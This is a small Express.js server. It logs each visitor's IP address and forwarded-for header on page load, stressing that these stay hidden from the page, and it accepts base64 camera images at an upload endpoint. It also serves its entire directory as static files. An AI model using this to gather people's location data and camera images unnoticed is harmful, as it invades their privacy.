const express = require('express');
const app = express();
const port = 3000;
const bodyParser = require('body-parser');
const path = require('path');

// Serve static files (like client-side HTML)
app.use(express.static(__dirname));

// To handle large image data (base64)
app.use(bodyParser.json({ limit: '10mb' }));

// Serve HTML page
app.get('/', (req, res) => {
  // Get client IP
  const ip = req.ip || req.connection.remoteAddress;
  console.log(`Client IP: ${ip}`);  // Log the IP to the console

  // Get location (for now, we'll use the IP address as the "location")
  const location = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  console.log(`Client Location: ${location}`);  // Log the location to the console

  // Serve the HTML page without sending IP/location to the frontend
  res.sendFile(path.resolve(__dirname, 'index.html'));
});

// Handle image data from the camera
app.post('/upload', (req, res) => {
  const imageData = req.body.image;  // Get the base64 image data
  console.log(`Received Image Data: ${imageData.substring(0, 100)}...`);  // Log part of the image data

  res.send('Image received');
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
